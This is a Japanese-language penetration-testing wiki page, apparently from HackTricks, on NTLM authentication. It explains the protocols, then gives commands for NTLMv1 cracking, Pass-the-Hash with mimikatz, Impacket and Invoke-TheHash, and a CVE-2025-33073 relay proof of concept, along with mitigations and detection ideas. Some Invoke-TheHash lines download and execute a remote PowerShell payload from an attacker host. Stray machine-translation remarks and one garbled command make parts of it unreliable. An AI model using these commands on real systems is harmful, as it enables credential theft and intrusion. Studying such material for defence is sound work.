# NTLM

{{#include ../../banners/hacktricks-training.md}}


## 基本情報

**Windows XP and Server 2003** が稼働している環境では、LM（Lan Manager）hashes が使用されますが、これらが容易に compromise される可能性があることは広く知られています。特定の LM hash `AAD3B435B51404EEAAD3B435B51404EE` は、LM が使用されていないことを示します。これは空の文字列に対する hash です。

デフォルトでは、**Kerberos** authentication protocol が主要な method として使用されます。NTLM（NT LAN Manager）は、Active Directory が存在しない場合、domain が存在しない場合、設定不備によって Kerberos が正常に動作しない場合、または有効な hostname ではなく IP address を使用して connection が試行された場合など、特定の状況で使用されます。

network packet に **"NTLMSSP"** header が存在する場合、NTLM authentication process が行われていることを示します。

authentication protocol - LM、NTLMv1、NTLMv2 - の support は、`%windir%\Windows\System32\msv1\_0.dll` にある特定の DLL によって提供されます。

**主なポイント**:

- LM hashes には vulnerability があり、空の LM hash（`AAD3B435B51404EEAAD3B435B51404EE`）は LM が使用されていないことを示します。
- Kerberos がデフォルトの authentication method であり、NTLM は特定の条件下でのみ使用されます。
- NTLM authentication packet は、"NTLMSSP" header によって識別できます。
- LM、NTLMv1、NTLMv2 protocol は、system file `msv1\_0.dll` によって support されます。

## LM、NTLMv1、NTLMv2

使用される protocol を確認および設定できます：

### GUI

_secpol.msc_ を実行 -> Local policies -> Security Options -> Network Security: LAN Manager authentication level。level は 0 から 5 までの 6 段階です。

![LM、NTLMv1、NTLMv2 - GUI: secpol.msc を実行 - Local policies - Security Options - Network Security: LAN Manager authentication level。level は 0 から 5 までの 6 段階です](<../../images/image (919).png>)

### Registry

これにより level 5 が設定されます：
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能な値:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 基本的な NTLM ドメイン認証 Scheme

1. **user** が自身の **credentials** を入力する
2. クライアントマシンが **domain name** と **username** を送信して、**authentication request** を送信する
3. **server** が **challenge** を送信する
4. **client** がパスワードの hash をキーとして **challenge** を **encrypt** し、response として送信する
5. **server** が **domain name、username、challenge、response** を **Domain controller** に送信する。**Active Directory** が設定されていない場合、または domain name が server の名前である場合、credentials はローカルで **checked** される。
6. **domain controller** がすべて正しいかを **check** し、情報を server に送信する

**server** と **Domain Controller** は、**Netlogon** server 経由で **Secure Channel** を作成できる。これは、Domain Controller が server のパスワードを知っているためである（パスワードは **NTDS.DIT** db 内に存在する）。

### Local NTLM authentication Scheme

認証の流れは前述のものと同じだが、**server** は **SAM** file 内に、認証を試みている **user** の **hash** を保持している。そのため、Domain Controller に問い合わせる代わりに、**server** 自身が user の認証可否を **check** する。

### NTLMv1 Challenge

**challenge の長さは 8 bytes** で、**response** の長さは 24 bytes である。

**NT hash（16bytes）** は **7bytes ずつ 3つの部分**（7B + 7B + (2B+0x00\*5)）に分割される。**最後の部分は zeros で埋められる**。その後、**challenge** が各部分を使って個別に **cipher** され、**cipher** された bytes の **result** が結合される。合計：8B + 8B + 8B = 24Bytes。

**Problems**:

- **randomness** の不足
- 3つの部分を個別に **attack** して NT hash を見つけられる
- **DES は crack 可能**
- 3つ目の key は常に **5つの zeros** で構成される
- **同じ challenge** を与えると、**response** も **same** になる。そのため、被害者への **challenge** として "**1122334455667788**" という string を与え、**precomputed rainbow tables** を使用して response を **attack** できる

### NTLMv1 attack

現在では、Unconstrained Delegation が設定された環境を見つけることは少なくなっている。しかし、これは設定された **Print Spooler service** を **abuse** できないという意味ではない。

AD 上ですでに保持している credentials/sessions の一部を **abuse** して、プリンターに **あなたが control している host** に対して authenticate するよう要求できる。その後、`metasploit auxiliary/server/capture/smb` または `responder` を使用して、**authentication challenge を 1122334455667788 に設定**し、authentication attempt を capture する。NTLMv1 を使用して実行された場合は、これを **crack** できる。\
`responder` を使用している場合は、**authentication** の **downgrade** を試みるために **flag `--lm` を使用**できる。\
_この technique では、authentication が NTLMv1 を使用して実行される必要がある（NTLMv2 は無効）。_

プリンターは authentication 中に computer account を使用することに注意すること。また、computer account は **long and random passwords** を使用するため、一般的な **dictionaries** では **おそらく crack できない**。しかし、**NTLMv1** authentication は **DES** を使用する（[詳細はこちら](#ntlmv1-challenge)）。そのため、DES の cracking 専用に設計された services を使用すれば crack できる（例として [https://crack.sh/](https://crack.sh) または [https://ntlmv1.com/](https://ntlmv1.com) を使用できる）。

### NTLMv1 attack with hashcat

NTLMv1 は NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) を使って break することもできる。この tool は NTLMv1 messages を、hashcat で break できる形式に format する。<sup>[[1]](#references)</sup>

この command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
翻訳する本文がありません。翻訳対象のMarkdownテキストを送ってください。
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
ファイルの内容が指定されていません。
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
hashcatを実行します（分散処理はhashtopolisのようなツールを使うのが最適です）。そうしないと数日かかります。
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
この場合、パスワードが password であることが分かっているため、デモ目的でチートします：
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
ここでは、hashcat-utilitiesを使用して、crackされたdes keysをNTLM hashの一部に変換する必要があります。
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
翻訳する本文を貼り付けてください。
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
翻訳する内容を貼り付けてください。
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge length は 8 bytes で**、**2 つの response が送信されます**: 1 つは **24 bytes** 長で、**もう 1 つの長さは可変**です。

**最初の response** は、**client と domain** で構成された **string** を、**key** として **NT hash** の **hash MD4** を使用し、**HMAC_MD5** で ciphering することで作成されます。その後、**result** が **key** として使用され、**challenge** を **HMAC_MD5** で ciphering します。これに **8 bytes の client challenge** が追加されます。合計: 24 B。

**2 つ目の response** は、複数の値（新しい client challenge、**replay attacks** を防ぐための **timestamp** など）を使用して作成されます。

**successful authentication process を capture した pcap** がある場合は、この guide に従って domain、username、challenge、response を取得し、password を creak できます: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**victim の hash を取得したら**、それを使用して **victim に impersonate** できます。\
その **hash を使用して NTLM authentication を実行する** **tool** を使用する必要があります。あるいは、新しい **sessionlogon** を作成して、その **hash** を **LSASS** 内に **inject** することもできます。これにより、**NTLM authentication が実行されるたびに、その hash が使用されます。** 最後の方法が mimikatz の動作です。

**Computer accounts を使用して Pass-the-Hash attacks も実行できることを忘れないでください。**

### **Mimikatz**

**administrator として実行する必要があります**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
これにより、mimikatzを起動したユーザーに属するプロセスが起動しますが、LSASS内部に保存されるcredentialsはmimikatzのparameters内にあるものになります。その後、平文のpasswordを知る必要なく、そのユーザーであるかのようにnetwork resourcesへアクセスできます（`runas /netonly` trickと同様です）。

### Pass-the-Hash from Linux

LinuxからPass-the-Hashを使用して、Windowsマシン上でcode executionを取得できます。\
[**実行方法についてはこちらを参照してください。**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

[Windows用のimpacket binariesはこちらからダウンロードできます](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe**（この場合はcommandを指定する必要があります。cmd.exeとpowershell.exeはinteractive shellを取得する目的では有効ではありません）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Impacket binariesは他にも複数あります...

### Invoke-TheHash

powershell scriptsはここから取得できます: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

この function は**他のすべての組み合わせ**です。**複数のホスト**を指定したり、一部を**除外**したり、使用する**option**（_SMBExec、WMIExec、SMBClient、SMBEnum_）を**選択**したりできます。**SMBExec**または**WMIExec**のいずれかを選択し、_**Command**_ パラメーターを指定しなかった場合は、**十分な権限**があるかどうかを**確認**するだけです。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**administrator として実行する必要があります**

このツールは mimikatz と同じ処理を行います（LSASS メモリを変更します）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### username と password を使用した Windows remote execution の手動実行


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host からの credentials の抽出

**詳細については、** [**Windows host から credentials を取得する方法について、このページを参照してください**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**。**

## Internal Monologue attack

Internal Monologue Attack は、**LSASS process と直接やり取りすることなく**、victim の machine から NTLM hashes を取得できる stealthy な credential extraction technique です。hashes を memory から直接読み取り、endpoint security solutions や Credential Guard によって頻繁に block される Mimikatz とは異なり、この attack は **Security Support Provider Interface (SSPI) 経由で NTLM authentication package (MSV1_0) への local calls** を利用します。attacker はまず、NetNTLMv1 を許可するために **NTLM settings**（例: LMCompatibilityLevel、NTLMMinClientSec、RestrictSendingNTLMTraffic）を **downgrade** します。次に、running processes から取得した既存の user tokens を impersonate し、local で NTLM authentication を trigger して、既知の challenge を使用した NetNTLMv1 responses を生成します。<sup>[[4]](#references)</sup>

これらの NetNTLMv1 responses を capture した後、attacker は **precomputed rainbow tables** を使用して元の NTLM hashes をすばやく復元でき、lateral movement のためのさらなる Pass-the-Hash attacks が可能になります。重要なのは、Internal Monologue Attack は network traffic を生成せず、code を inject せず、direct memory dumps も trigger しないため、stealthy な点です。そのため、Mimikatz のような従来の methods と比較して defenders による検出が困難です。

enforced security policies により NetNTLMv1 が accepted されない場合、attacker は NetNTLMv1 response の取得に失敗する可能性があります。

このケースに対応するため、Internal Monologue tool は update されました。`AcceptSecurityContext()` を使用して server token を動的に取得し、NetNTLMv1 が失敗した場合でも **NetNTLMv2 responses を capture** できるようになっています。NetNTLMv2 は crack がはるかに困難ですが、relay attacks や、限定的なケースでは offline brute-force への道を依然として開きます。

PoC は **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** にあります。

## NTLM Relay and Responder

**これらの attacks の実行方法については、こちらのより詳細な guide を参照してください:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## network capture から NTLM challenges を parse する

**以下を使用できます:** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows には、host から発生した NTLM（または Kerberos）authentication を **同じ** host に relay して SYSTEM privileges を取得する *reflection* attacks を防止しようとする複数の mitigations が含まれています。

Microsoft は、MS08-068 (SMB→SMB)、MS09-013 (HTTP→SMB)、MS15-076 (DCOM→DCOM) およびその後の patches により、public chains の大部分を阻止しました。しかし **CVE-2025-33073** は、*marshalled*（serialized）target-info を含む **SMB client が Service Principal Names (SPNs) を truncate する方法**を悪用することで、protections を依然として bypass できることを示しています。<sup>[[5]](#references)[[6]](#references)</sup>

### bug の TL;DR
1. attacker は、marshalled SPN を encode した label を持つ **DNS A-record** を register します。例:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. victim は、その hostname に authenticate するよう強制されます（PetitPotam、DFSCoerce など）。
3. SMB client が target string `cifs/srv11UWhRCAAAAA…` を `lsasrv!LsapCheckMarshalledTargetInfo` に渡すと、`CredUnmarshalTargetInfo` の call が serialized blob を **strip** し、**`cifs/srv1`** を残します。
4. これにより、`msv1_0!SspIsTargetLocalhost`（または Kerberos の equivalent）は、短い host part が computer name (`SRV1`) と一致するため、target を *localhost* とみなします。
5. その結果、server は `NTLMSSP_NEGOTIATE_LOCAL_CALL` を set し、**LSASS の SYSTEM access-token** を context に inject します（Kerberos では SYSTEM-marked subsession key が作成されます）。
6. その authentication を `ntlmrelayx.py` **または** `krbrelayx.py` で relay すると、同じ host 上で full SYSTEM rights が得られます。<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* **CVE-2025-33073** 向けの KB patch は、`mrxsmb.sys::SmbCeCreateSrvCall` にチェックを追加し、marshalled info を含むターゲット（`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`）への SMB connection をブロックします。<sup>[[5]](#references)[[6]](#references)</sup>
* unpatched hosts でも reflection を防ぐため、**SMB signing** を強制します。
* `*<base64>...*` に類似する DNS records を監視し、coercion vectors（PetitPotam、DFSCoerce、AuthIP...）をブロックします。

### Detection ideas
* client IP ≠ server IP の `NTLMSSP_NEGOTIATE_LOCAL_CALL` を含む network captures。
* subsession key と hostname と同一の client principal を含む Kerberos AP-REQ。
* 同一 host からの remote SMB writes に直ちに続く Windows Event 4624/4648 SYSTEM logons。<sup>[[5]](#references)</sup>

**March 2026** の local reflection variant については、**SMB arbitrary ports** と **TCP connection reuse** を悪用して `NT AUTHORITY\SYSTEM` に到達します。以下を参照してください。

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
